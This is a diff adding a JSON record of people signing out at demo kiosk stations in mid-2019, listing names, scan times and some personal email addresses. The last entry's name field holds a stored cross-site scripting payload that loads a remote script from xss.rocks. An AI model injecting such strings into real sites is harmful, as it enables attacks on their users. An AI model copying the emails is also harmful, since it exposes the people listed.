@@ -1,0 +1,530 @@
+[
+  {
+    "personGuid": "6dd8a7d7-db7b-4527-bdbe-6d8154b78f89",
+    "name": "Gaelle",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-07-02T10:54:33.227Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "5acc406a-0580-4d2f-bb8e-69373afbaedb",
+    "name": "Audrey",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-07-02T10:52:21.5Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "2dd663ee-6cb0-4450-becb-6120a255e614",
+    "name": "Alex",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-07-02T10:16:11.55Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "86aae7b5-6911-443a-abe7-0cca8e3a8918",
+    "name": "Jo",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-07-02T09:30:02.18Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "efff0373-b6b7-4b5e-b350-596772ab201c",
+    "name": "Greg",
+    "email": "greg@3kd.be",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-07-02T09:29:50.727Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "534011ff-dfed-4d71-8737-59e4b961d9c2",
+    "name": "Paul",
+    "email": "paul.williams@theo2.co.uk",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-07-02T09:15:05.083Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "841c732a-9b97-4158-9a9c-b4e983f58f2b",
+    "name": "Caitlin ",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-07-02T09:12:23.957Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "ef03e63b-ce3e-45b9-91c3-fd3d6ee04538",
+    "name": "Mary",
+    "email": "Mary",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-07-02T07:08:34.807Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "cb1a0cbd-8e09-440c-af12-3eec185d5956",
+    "name": "Adam",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-07-01T17:30:44.237Z",
+      "inOutFlag": false,
+      "stationGuid": "57f162e5-4c3e-4475-aa77-341f499195fd",
+      "stationName": "OfficeDemoStation"
+    }
+  },
+  {
+    "personGuid": "cd848865-bd05-4dba-b031-30119ebdce64",
+    "name": "Alex",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-29T18:50:32.79Z",
+      "inOutFlag": false,
+      "stationGuid": "57f162e5-4c3e-4475-aa77-341f499195fd",
+      "stationName": "OfficeDemoStation"
+    }
+  },
+  {
+    "personGuid": "b816dcc4-52b1-4040-be2e-809a4602918c",
+    "name": "Clive",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T14:29:40.453Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "166cbb6b-1254-4e27-8450-022d5f23c0cf",
+    "name": "Mary",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T14:29:18.533Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "a03bcd05-9588-4726-81af-4533cb8e85c5",
+    "name": "Mary",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T14:29:13.167Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "2e7d16f0-1efe-4bbc-8e4d-2dc4e1bb9827",
+    "name": "Mary",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T14:28:47.143Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "ffa795e1-cf86-4808-aeac-5aa65be8ea65",
+    "name": "Mary",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T14:28:46.093Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "e29c0766-a143-4038-9118-60d982c70b45",
+    "name": "Albert Ricart",
+    "email": "albertricartr@gmail.com",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T14:27:27.473Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "b33c716d-c950-4dc3-a98e-2288f7f55a81",
+    "name": "Victor",
+    "email": "vcortessole@gmail.com",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T14:24:58.737Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "7e4d3cf5-a33d-4b4c-8ed1-8cd902cadcee",
+    "name": "JAVIER DE LA OSSA FALERO",
+    "email": "jossaf@gmail.com",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T14:23:00.853Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "bdbb14e2-1960-4ec6-b41e-70fe6f6a4939",
+    "name": "Chris",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T14:22:33.253Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "ad9ac125-fafe-4b87-a15d-740f21bc84bb",
+    "name": "Adam",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T11:59:46.547Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "1bcf81cb-74f8-497a-af07-c5e453fac9aa",
+    "name": "Greg Swimer",
+    "email": "greg.swimer@cityfoootball.con",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T11:59:30.877Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "2515c48f-4c3d-47cf-b9ee-7547bede2a35",
+    "name": "Joe",
+    "email": "joaofernandes@buzzstreets.com",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T11:46:44.05Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "d48d4ff8-5eb5-4718-8012-7a97975ab911",
+    "name": "Andrew",
+    "email": "ajgilligan@com",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T11:00:57.11Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "fe90fe02-8ab7-4fd6-9716-001ac63011d4",
+    "name": "Mariana",
+    "email": "marianarosca1@hotmail.com",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T11:00:42.77Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "30839300-ab3a-4235-821d-78844f786cbd",
+    "name": "Ferran",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T10:41:37.85Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "7675e130-afec-4717-b104-589c2f2fd09e",
+    "name": "Menno",
+    "email": "mennohuib@yahoo.es",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T08:38:03.06Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "e2f554bc-b6fb-420c-9ece-c2a2035f6b0b",
+    "name": "Marc",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-28T08:13:14.717Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "967da693-8501-40d6-8276-ed5850270446",
+    "name": "Tom Mahon",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-26T15:03:40.943Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "3b34a09b-4e9d-45ba-a3eb-c38b9a7d8520",
+    "name": "Danny",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-26T14:46:23.727Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "d92073d6-acd6-49c8-a765-ae29883e50b5",
+    "name": "Hammoudeh",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-26T13:49:54.473Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "5b965496-6df4-465f-886f-b36e58852424",
+    "name": "Nick",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-26T13:24:47.69Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "a4b9436c-e6e0-4b19-838e-943ac0796929",
+    "name": "Andrey",
+    "email": "achib@yandex.ru",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-25T16:50:47.66Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "fb9b8c5b-cb8d-4fb3-bed4-dc1ce00db12b",
+    "name": "Mike M",
+    "email": "mikeamorris100@gmail.com",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-25T14:53:09.28Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "991896f3-5bfd-47af-a2c1-1ce270728998",
+    "name": "Charlie",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-25T13:09:21.57Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "9e7060b0-6f70-4158-b87f-3f77a8ff77e4",
+    "name": "Dušan",
+    "email": "dusan@brejka.sk",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-25T13:04:50.207Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "9fd9eee9-09c2-479f-aa9b-90006e50ebfb",
+    "name": "Matt",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-25T12:12:42.553Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "3c31cf9d-f831-492a-be70-3fc51d6913fe",
+    "name": "Ryan",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-25T12:08:53.823Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "c000b1e4-ce93-404f-bda1-6aff992b1521",
+    "name": "Andy",
+    "email": "andrew.selby@cityfootball.com",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-25T12:06:38.213Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "7548207f-06ad-4f7c-a4da-7cd153d3909e",
+    "name": "Harvey ",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-24T16:35:58.837Z",
+      "inOutFlag": false,
+      "stationGuid": "8b75544b-7750-4311-afd2-0d4945f7420b",
+      "stationName": "DemoStation1"
+    }
+  },
+  {
+    "personGuid": "d6746c45-d71a-47c6-8dd3-308984b6c23b",
+    "name": "Alex K",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-24T02:17:13.41Z",
+      "inOutFlag": false,
+      "stationGuid": "f88c3d3f-b98f-48b5-964b-4285549e899b",
+      "stationName": "SummitStation2"
+    }
+  },
+  {
+    "personGuid": "fe95a1ac-dab6-4b25-a286-ef837cd22bbe",
+    "name": "Melon",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-21T04:39:47.573Z",
+      "inOutFlag": false,
+      "stationGuid": "a890897f-1f89-493d-89fc-bbaf50f8ddc5",
+      "stationName": "DemoStation2"
+    }
+  },
+  {
+    "personGuid": "226b385d-0ff8-456d-a2d6-5184df0d1920",
+    "name": "Taxation is Theft ",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-21T04:38:34.89Z",
+      "inOutFlag": false,
+      "stationGuid": "a890897f-1f89-493d-89fc-bbaf50f8ddc5",
+      "stationName": "DemoStation2"
+    }
+  },
+  {
+    "personGuid": "02873142-3645-419f-a56c-3a5e38a67b26",
+    "name": "Fsgdb",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-20T22:10:13.183Z",
+      "inOutFlag": false,
+      "stationGuid": "a890897f-1f89-493d-89fc-bbaf50f8ddc5",
+      "stationName": "DemoStation2"
+    }
+  },
+  {
+    "personGuid": "c7ed3535-cfd5-492a-9416-020f57331e01",
+    "name": "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
+    "email": "",
+    "inScan": null,
+    "outScan": {
+      "dateAdded": "2019-06-20T21:54:23.47Z",
+      "inOutFlag": false,
+      "stationGuid": "a890897f-1f89-493d-89fc-bbaf50f8ddc5",
+      "stationName": "DemoStation2"
+    }
+  }
+]
